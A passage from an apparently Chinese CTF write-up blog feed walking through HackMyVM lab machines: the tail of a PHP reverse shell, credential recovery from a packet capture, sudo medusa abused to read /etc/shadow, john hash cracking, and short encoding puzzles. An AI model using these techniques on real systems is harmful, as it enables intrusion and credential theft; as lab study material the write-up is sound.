                if ($debug) printit('STDOUT: $input');
                fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit('STDERR READ');
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit('STDERR: $input');
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print '$string\n';
        }
}

?&gt;

09:50:24.003100 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [F.], seq 2799, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018458], length 0
E..4.=@.@.|..........P......+G.............
_......Z
09:50:24.003289 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [.], ack 2799, win 496, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
E..4..@.@.G9...........P+G.................
...Z_...
09:50:24.003466 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [F.], seq 153, ack 2800, win 501, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
E..4..@.@.G8...........P+G.................
...Z_...
09:50:24.003474 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [.], ack 154, win 508, options [nop,nop,TS val 1602276767 ecr 2885018458], length 0
E..4.&gt;@.@.|..........P......+G.............
_......Z
09:50:24.003898 IP 192.168.205.167.http &gt; 192.168.205.1.60742: Flags [P.], seq 1:2113, ack 573, win 501, length 2112: HTTP: HTTP/1.1 200 OK
E....R@.@............P.F..p...&amp;.P.......HTTP/1.1 200 OK
Date: Mon, 07 Jul 2025 13:50:24 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 1859
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

...........X}o.6...|.....R!@..G.[....M...6M..L........n....v.!.J7R)........W..n.~...H'.UcT.(    .....f:.W....aB?gTi*G.[u.J?...7.....z5.Pp.      I...!\KF..P.........    Yv.,....z.tY..s.....i.... `|&gt;........Rd&lt;..'.r...ss......&gt;.K.....6.'b........I..)To{..Q.   ..(8H..G....i.N.....D...Q.-OOOke.       .E2.L..Y..)..dE..Ph.&lt;.2../.dl..M...4&amp;..aL+...t7...L...R:nj.....Q.xx|.;.;..;k..A..eg...2.........&lt;..~.^1..H+......Km13..h*..t...0._.H..g..w..6.$UY.1...1..'.......I....5BLCmMP....:A9..G..-......X1|..P.09...
...^.u.4...B....5.S[6*....A.\u0..[.^v'...6....a...,..............6C;*%&gt;...;.I...#/..#....i.y#....c....jA.uc.E....L!......1B.KT..'TG'.7..&gt;=. ,.-.P*.....3.7.c....Q.q..T..e.3(M.F3.......6A..L.....C...Y.t..=.~.7...z.9.....z...(.d]I..E.W7....(...!..t...&lt;....A...Ew.;.......[.v.(]..L..,..R.......a.\....w(@...o.\&amp;..h.C....v.&gt;....1MP[.......}....E...,Mi.Z..Y.L........5.BKH......,.1.w...'.R|..J...O..D^B......u....4....6.........[.S.h(...%t.......9...N&gt;.x.....s&amp;.e..s...R...w....S..$.......o~....b.S\...0.....iJp.gq..TJ!.......d
t.%,........fDE.a+......2,.:.....Bh......t..V-w*...........
yt.b1..z..V9j....7.N.....{9.-g....n2.......m....r.-3L.}-#:,....@o...XfMYjC.
..St.bA..G.c..9.3;dA.W..Q.+.X.nQ...z....?..=a..tw.a..&lt;DL..a..b.1m.      ....%.&amp;qw..y.Q.d...6......D..w....;BrN..1D...........y.6.......c^.`{C&lt;c.W.`{[....b..,.2.....|.s-.J....).S........e....,...$.&amp;...X7+.m....!.........8...i .eA(Eb...b..2..{.s.I..5L./b...4..L.w.S)|...5|.:/..G.m..x.AU;..WLM...L..U..k....8+,8X6.&gt;.(.$1i6...,..[.....N.D.....$.}$&amp;&lt;.vcS.O.o...B&gt;...&amp;`...^b:b..m...    '..B..
[.......'...:.p..       .D..TDf..c^B...%../B.Y.c...E....T2.....1.....&gt;....b...+...T+...yGr..........Z.O7....~.........n~...........t.....QZ...Cp(%...P.TG..yg.F.l..........)....E..Rn.g...L.......T.D~.:.P..B...X....Z.o/.....X..'Fq1.....f^..UUx.O.....|N.'/.@'.w.E.....k....=~.V.w........~.4.&gt;...#;.....#.6..)...g...Q.+^7N...H....d...[..o._$..C....
09:50:24.004210 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [.], ack 2113, win 513, length 0
E..(..@..............F.P..&amp;...x.P...|.........
^C
30 packets captured
30 packets received by filter
0 packets dropped by kernel
                     
```

Authorization: Basic Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==



base64Ëß£‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ echo 'Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==' |base64 -d
cnhyk:bcf829627eea364a3abc41a6537fbf543e974ff8                                  
```

ÁôªÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh cnhyk@192.168.205.167           
The authenticity of host '192.168.205.167 (192.168.205.167)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:6: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.167' (ED25519) to the list of known hosts.
cnhyk@192.168.205.167's password: 
Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
cnhyk@Basic:~$ id
uid=1000(cnhyk) gid=1000(cnhyk) groups=1000(cnhyk)
cnhyk@Basic:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for cnhyk: 
Sorry, user cnhyk may not run sudo on Basic.
```

ÊâæÊèêÊùÉÁÇπ

```
cnhyk@Basic:~$ cat user.txt 
flag{user-df31759540dc28f75a20f443a19b1148}
cnhyk@Basic:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
cnhyk@Basic:~$ ss -tulnp
Netid               State                Recv-Q               Send-Q                             Local Address:Port                               Peer Address:Port               
udp                 UNCONN               0                    0                                        0.0.0.0:68                                      0.0.0.0:*                  
tcp                 LISTEN               0                    128                                      0.0.0.0:22                                      0.0.0.0:*                  
tcp                 LISTEN               0                    128                                         [::]:22                                         [::]:*                  
tcp                 LISTEN               0                    128                                            *:80                                            *:*                  
cnhyk@Basic:~$ cd /opt/
cnhyk@Basic:/opt$ ls -al
total 28
drwxr-xr-x  2 root root  4096 Jul  6 09:21 .
drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
-rwx--x--x  1 root root 17016 Jul  6 09:21 jojo
cnhyk@Basic:/opt$ ./jojo 
ÈóÆÈ¢ò 1: ËØ∑ËæìÂÖ• 80+87
80+87
Ê≠£Á°ÆÔºÅ
ÈóÆÈ¢ò 2: ËØ∑ËæìÂÖ• 57+91
^C
```

ÊàëÊÑøÁß∞‰πã‰∏∫‰º™‰∫∫ÊµãËØïÔºåÂìàÂìàÂìàÔºàÁ∫ØÂºÄÁé©Á¨ëÔºåÊ≤°ÊúâÂÜíÁäØÁöÑÊÑèÊÄùÔºâ

```
cnhyk@Basic:/tmp$ cat a.py 
cat a.py 
#!/usr/bin/env python3
import subprocess
import sys

JOJO_EXECUTABLE = '/opt/jojo'

def slv():
    print(f'[+] Ê≠£Âú®ÂêØÂä®ÁõÆÊ†áÁ®ãÂ∫è: {JOJO_EXECUTABLE}')

    try:
        cmd = ['stdbuf', '-oL', JOJO_EXECUTABLE]
        p = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
    except FileNotFoundError:
        print(f'[!] ÈîôËØØÔºöÊâæ‰∏çÂà∞Á®ãÂ∫è '{JOJO_EXECUTABLE}' Êàñ 'stdbuf'„ÄÇËØ∑Ê£ÄÊü•„ÄÇ')
        sys.exit(1)

    print('[+] ËøûÊé•ÊàêÂäüÔºÅÂºÄÂßãËá™Âä®Âåñ‰∫§‰∫í...\n')

    while True:
        l = p.stdout.readline()
        if not l:
            break
        print(l.strip())

        if 'ËØ∑ËæìÂÖ•' in l:
            try:
                q = l.split('ËØ∑ËæìÂÖ• ')[1].strip()
                ans = q
                print(f'[*] Ê£ÄÊµãÂà∞ÈóÆÈ¢òÔºåÊèêÂèñÂÜÖÂÆπ: {ans}')
                print(f'[*] Ëá™Âä®ËæìÂÖ•: {ans}')
                p.stdin.write(ans + '\n')
                p.stdin.flush()
                print('-' * 20)
            except IndexError:
                print('[!] Ë≠¶ÂëäÔºöÊó†Ê≥ï‰ªéË°å‰∏≠Ëß£ÊûêÈóÆÈ¢ò„ÄÇ')

    p.wait()
    print(f'\n[+] ‰∫§‰∫íÁªìÊùü„ÄÇÁ®ãÂ∫èÈÄÄÂá∫ÔºåËøîÂõûÁ†Å: {p.returncode}')

if __name__ == '__main__':
    slv()
```

ÊâßË°å

```
cnhyk@Basic:/tmp$ python3 $_
python3 $_
[+] Ê≠£Âú®ÂêØÂä®ÁõÆÊ†áÁ®ãÂ∫è: /opt/jojo
[+] ËøûÊé•ÊàêÂäüÔºÅÂºÄÂßãËá™Âä®Âåñ‰∫§‰∫í...

ÈóÆÈ¢ò 1: ËØ∑ËæìÂÖ• 61+34
[*] Ê£ÄÊµãÂà∞ÈóÆÈ¢òÔºåÊèêÂèñÂÜÖÂÆπ: 61+34
[*] Ëá™Âä®ËæìÂÖ•: 61+34
--------------------
ÁúÅÁï•
--------------------
Ê≠£Á°ÆÔºÅ
ÈóÆÈ¢ò 500: ËØ∑ËæìÂÖ• 95+68
[*] Ê£ÄÊµãÂà∞ÈóÆÈ¢òÔºåÊèêÂèñÂÜÖÂÆπ: 95+68
[*] Ëá™Âä®ËæìÂÖ•: 95+68
--------------------
Ê≠£Á°ÆÔºÅ
jojo:jojo

[+] ‰∫§‰∫íÁªìÊùü„ÄÇÁ®ãÂ∫èÈÄÄÂá∫ÔºåËøîÂõûÁ†Å: 0
```

jojo:jojoÔºåÂïäËøôÊâÄ‰ª•Êàë‰∏ÄÂºÄÂßãÊµãËØïÂº±ÂØÜÁ†ÅÂ∞±‰∏çÁî®ÂÜô‰ª£Á†Å‰∫Ü......

```
jojo@Basic:/tmp$ id
uid=1001(jojo) gid=1001(jojo) groups=1001(jojo)
jojo@Basic:/tmp$ sudo -l
Matching Defaults entries for jojo on Basic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jojo may run the following commands on Basic:
    (ALL) NOPASSWD: /usr/bin/medusa
```

ÊòæËÄåÊòìËßÅ‰∫ÜÔºåËøôÊòØ‰∏Ä‰∏™ÂØÜÁ†ÅÁàÜÁ†¥Â∑•ÂÖ∑ÔºåÊâÄ‰ª•ÂÆÉËØªÂèñÂ≠óÂÖ∏Â§ßÊ¶ÇÊòØÊúâÈóÆÈ¢òÁöÑ

```
jojo@Basic:/tmp$ sudo /usr/bin/medusa --help
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;

/usr/bin/medusa: invalid option -- '-'
CRITICAL: Unknown error processing command-line options.
ALERT: User logon information must be supplied.

Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
  -h [TEXT]    : Target hostname or IP address
  -H [FILE]    : File containing target hostnames or IP addresses
  -u [TEXT]    : Username to test
  -U [FILE]    : File containing usernames to test
  -p [TEXT]    : Password to test
  -P [FILE]    : File containing passwords to test
  -C [FILE]    : File containing combo entries. See README for more information.
  -O [FILE]    : File to append log information to
  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
  -M [TEXT]    : Name of the module to execute (without the .mod extension)
  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a
                 different parameter each time and they will all be sent to the module (i.e.
                 -m Param1 -m Param2, etc.)
  -d           : Dump all known modules
  -n [NUM]     : Use for non-default TCP port number
  -s           : Enable SSL
  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
  -c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).
  -t [NUM]     : Total number of logins to be tested concurrently
  -T [NUM]     : Total number of hosts to be tested concurrently
  -L           : Parallelize logins using one username per thread. The default is to process 
                 the entire username before proceeding.
  -f           : Stop scanning host after first valid username/password found.
  -F           : Stop audit after first valid username/password found on any host.
  -b           : Suppress startup banner
  -q           : Display module's usage information
  -v [NUM]     : Verbose level [0 - 6 (more)]
  -w [NUM]     : Error debug level [0 - 10 (more)]
  -V           : Display version
  -Z [TEXT]    : Resume scan based on map of previous scan
```

Âà©Áî®

```
jojo@Basic:/tmp$ sudo /usr/bin/medusa -u root -h 127.0.0.1 -M ssh -P /root/root.txt -v 64
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;

GENERAL: Parallel Hosts: 1 Parallel Logins: 1
GENERAL: Total Hosts: 1 
GENERAL: Total Users: 1
GENERAL: Total Passwords: 1
ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: flag{root-c065860911bb44a2483c096cbd203df9} (1 of 1 complete)
GENERAL: Medusa has finished.
jojo@Basic:/tmp$ sudo /usr/bin/medusa -u root -h 127.0.0.1 -M ssh -P /etc/shadow -v 64
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;

GENERAL: Parallel Hosts: 1 Parallel Logins: 1
GENERAL: Total Hosts: 1 
GENERAL: Total Users: 1
GENERAL: Total Passwords: 27
ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: root:$6$sshVeDa7z638dY8S$ZrwHy6TQ8VMkgSx1mGhCPG8Lffedn9LbDPcgCoQdF877zeXPR.NGhm20RlipL5s0HfPQByfwXyVXnM1giQ9tX0:20275:0:99999:7::: (1 of 27 complete)
^CALERT: Medusa received SIGINT - Sending notification to login threads that we are are aborting.
ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: daemon:*:20166:0:99999:7::: (2 of 27 complete)
ALERT: To resume scan, add the following to your original command: '-Z h1u1.'
```

ÁàÜÁ†¥hash

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                         
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
budayday         (root)     
1g 0:00:00:36 DONE (2025-07-07 11:16) 0.02707g/s 27110p/s 27110c/s 27110C/s buldogs..brittany_
Use the '--show' option to display all of the cracked passwords reliably
Session completed. 
```

ÊâÄ‰ª•ËØ¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ grep -w -n 'budayday' /usr/share/wordlists/rockyou.txt                                                                                                
999993:budayday
                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ echo 'budayday' &gt; pass                                                                                                        
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh root@192.168.205.167                                       
root@192.168.205.167's password: 
Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul  6 08:23:47 2025 from 192.168.3.94
root@Basic:~# id
uid=0(root) gid=0(root) groups=0(root)
```

‰Ω†Á°¨Ë∑ëÂ∫îËØ•Ë∑ëÁöÑÂá∫Êù•ÔºåÊàëÊµÖË∑ë‰∫Ü500Ë°åÊ≤°ÊúâÈôêÂà∂

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Basic.html</guid><pubDate>Mon, 07 Jul 2025 15:25:27 +0000</pubDate></item><item><title>Challenge 057</title><link>https://7r1UMPHK.github.io/post/Challenge%20057.html</link><description>![image-20250705222109182](https://7r1umphk.github.io/image/20250705222109387.webp)

```
Èµ∑ìÅ•Èë•Èô®È©∂ñ•üìçØÈùüÈ©•ÈëÆíÖ≤Ê±™ÊΩü·î© Ex: HMV{Flag}
```

Â≠óÁ¨¶‰æùÁÑ∂ÊòØË∂ÖÂÆΩ UnicodeÔºåÂæàÂÉè‰∏äÈÅìÈ¢ò„ÄÇ
Âê´ÊúâÂ§öÁßçËØ≠Á≥ªÂ≠óÁ¨¶ Ê±âÂ≠ó„ÄÅÂüÉÂèäË±°ÂΩ¢„ÄÅÈòøÊãâ‰ºØ„ÄÅÁΩïËßÅ CJK Êâ©Â±ï

https://www.better-converter.com/Encoders-Decoders/Base65536-Decode

![image-20250705222147026](https://7r1umphk.github.io/image/20250705222147304.webp)

```
where_have_you_been_rpj7_:)
```

Â∞èÂΩ©ËõãÔºå‰πãÂâçÈÇ£‰∏™Âá∫base2048ÁöÑÂ∞±ÊòØrpj7sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20057.html</guid><pubDate>Sat, 05 Jul 2025 14:35:12 +0000</pubDate></item><item><title>Challenge 056</title><link>https://7r1UMPHK.github.io/post/Challenge%20056.html</link><description>![image-20250705220557455](https://7r1umphk.github.io/image/20250705220557660.webp)

```
&lt;pre&gt; ’∂“ø‘à‡≥°‡±æ‡¨≥ﬂ¶œª›ßWÿ∑‡≤ß√Ü—ï‡∞ä€∑‹î—§…¶‡∂∞ ™–∫‡≥û∆ù›©‡¶¨ƒë”å‡†í‡™¨‡∫¢‘©›ôœÖ‡¢≤⁄µ‡°î‡§§ Hint: Base what? &lt;/pre&gt;
```

ÊèêÁ§∫base
ÂÖ®ÊòØ Unicode Â≠óÁ¨¶
ÊòéÊòæ‰∏çÊòØ base64„ÄÅbase32„ÄÅbase58 Á≠âÂ∏∏ËßÅÁºñÁ†Å
ÂåÖÂê´Âçó‰∫ö,ÈòøÊãâ‰ºØ,Ê≥∞ÊñáÁ≠âÂ≠óÁ¨¶ÔºöÂèØËÉΩÂ±û‰∫é**‚ÄúË∂ÖÂ§ßÂü∫Êï∞ÁºñÁ†Å‚Äù**Ôºà‰æãÂ¶Ç base1024„ÄÅbase2048Ôºâ„ÄÇ
ÊâÄ‰ª•ÊâíÊãâÂêß

https://nerdmosis.com/tools/encode-and-decode-base2048

![image-20250705220651285](https://7r1umphk.github.io/image/20250705220651530.webp)

```
The flag you are looking for is just 'HMV{Base2048}'
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20056.html</guid><pubDate>Sat, 05 Jul 2025 14:33:20 +0000</pubDate></item><item><title>Challenge 055</title><link>https://7r1UMPHK.github.io/post/Challenge%20055.html</link><description>![image-20250705214803760](https://7r1umphk.github.io/image/20250705214803963.webp)

```
&lt;pre&gt; MCZJ/CJ[[J]\.7¬ø?;(?9!?-\/&lt;;¬ø:=(=6!?-X K: wtf &lt;/pre&gt;
```

ÊúâÁÇπË∞úËØ≠‰∫∫ÔºåÊòØXOR
ÊàëÁöÑÂº∫Ë°åÁêÜËß£Â∞±ÊòØ
ÁúãËµ∑Êù•‰π±Ôºå‰ΩÜÈÉΩÊòØASCIIÂèØÊâìÂç∞Â≠óÁ¨¶
Êúâkey
Êúâ?
Ê≤°ÊúâÊòéÊòæ base64/hex ÁâπÂæÅ

![image-20250705220022860](https://7r1umphk.github.io/image/20250705220022997.webp)

![image-20250705220038576](https://7r1umphk.github.io/image/20250705220039230.webp)

HMV{CAP}sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20055.html</guid><pubDate>Sat, 05 Jul 2025 14:30:52 +0000</pubDate></item><item><title>Challenge 054</title><link>https://7r1UMPHK.github.io/post/Challenge%20054.html</link><description>![image-20250705190326651](https://7r1umphk.github.io/image/20250705190326857.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl -v http://momo.hackmyvm.eu/f0rw4rd  
* Host momo.hackmyvm.eu:80 was resolved.
* IPv6: (none)
* IPv4: 5.45.101.64
*   Trying 5.45.101.64:80...
* Connected to momo.hackmyvm.eu (5.45.101.64) port 80
* using HTTP/1.x
&gt; GET /f0rw4rd HTTP/1.1
&gt; Host: momo.hackmyvm.eu
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 301 Moved Permanently
&lt; Server: nginx/1.18.0
&lt; Date: Sat, 05 Jul 2025 11:03:36 GMT
&lt; Content-Type: text/html
&lt; Content-Length: 169
&lt; Location: http://momo.hackmyvm.eu/f0rw4rd/
&lt; Connection: keep-alive
&lt; 
&lt;html&gt;
&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
* Connection #0 to host momo.hackmyvm.eu left intact
                                                                     
```

ËøôÊåëÊàò‰πüÊòØËßÅÈ¨º

‰πüÊòØ‰∏çË°å

https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackMyVM/Challenges/Web/054

Â∑®È≠î‰Ω¨ÂèØ‰ª•Â§çÁé∞ÔºåÊàëÂ§çÁé∞‰∏ç‰∫ÜÔºå‰∏çÁÆ°‰∫ÜÔºåÊêÅÁùÄ

```
HMV{Pay-it-FORWARD-x!}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20054.html</guid><pubDate>Sat, 05 Jul 2025 14:25:59 +0000</pubDate></item><item><title>Challenge 053</title><link>https://7r1UMPHK.github.io/post/Challenge%20053.html</link><description>![image-20250705184956768](https://7r1umphk.github.io/image/20250705185005753.webp)

https://hackmyvm.eu/challenges/challenge.php?c=053

```
&lt;pre&gt; 9950b5c66f8518f8b012359dc7390589 c03ec75734f58d87cddff35c57786429 e757e84e31ef68a74d86d6b52478654c HMV{c761d942cf5fe4ba9ece382739afef4e} &lt;/pre&gt;
```

ÁúãÁùÄÂÉèhash

![image-20250705185544591](https://7r1umphk.github.io/image/20250705185544745.webp)

ÂÉèÊâæËßÑÂæãÔºåÁîüÊàêÂ≠óÂÖ∏

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ crunch 7 7 -t 1@@@@@4 -o pass                  
Crunch will now generate the following amount of data: 95051008 bytes
90 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 11881376 

crunch: 100% completed generating output
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ tail -n 1 pass
1zzzzz4
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ head -n 1 pass               
1aaaaa4
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ john --wordlist=pass --format=raw-md5 hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
1lordp4          (?)     
1g 0:00:00:00 DONE (2025-07-05 07:02) 9.090g/s 48041Kp/s 48041Kc/s 48041KC/s 1loqiq4..1lormd4
Use the '--show --format=Raw-MD5' options to display all of the cracked passwords reliably
Session completed. 
                      
```

HMV{1lordp4}sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20053.html</guid><pubDate>Sat, 05 Jul 2025 14:25:39 +0000</pubDate></item><item><title>hmv_Fuzzz</title><link>https://7r1UMPHK.github.io/post/hmv_Fuzzz.html</link><description>```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l                   
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.163 08:00:27:38:b0:90       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e4:9a:30       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.285 seconds (112.04 hosts/sec). 4 responded
                                                                                                   
```

192.168.205.163

ÊúçÂä°Êé¢Êµã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:10 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5555/tcp open  freeciv
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds                       

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p5555 -sV 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:10 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00035s latency).

PORT     STATE SERVICE VERSION
5555/tcp open  adb     Android Debug Bridge (token auth required)
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Android; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.40 seconds
```

adbÔºåËøûÊé•‰∏äÂéª

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ adb connect 192.168.205.163:5555
connected to 192.168.205.163:5555
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ adb devices                     
List of devices attached
192.168.205.163:5555    device

                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ adb shell  
/ $ id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
/ $ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

[sudo] password for runner: 
sudo: a password is required
/ $ cd 
~ $ ls -al
total 8
drwx------    2 runner   runner        4096 May 19 09:08 .
drwxr-xr-x    4 root     root          4096 May 19 10:02 ..
lrwxrwxrwx    1 root     runner           9 May 19 09:08 .ash_history -&gt; /dev/null
~ $ ss -tnlp
/bin/sh: ss: not found
~ $ netstat -lntup
netstat: showing only processes with your user ID
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      2513/python3
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
```

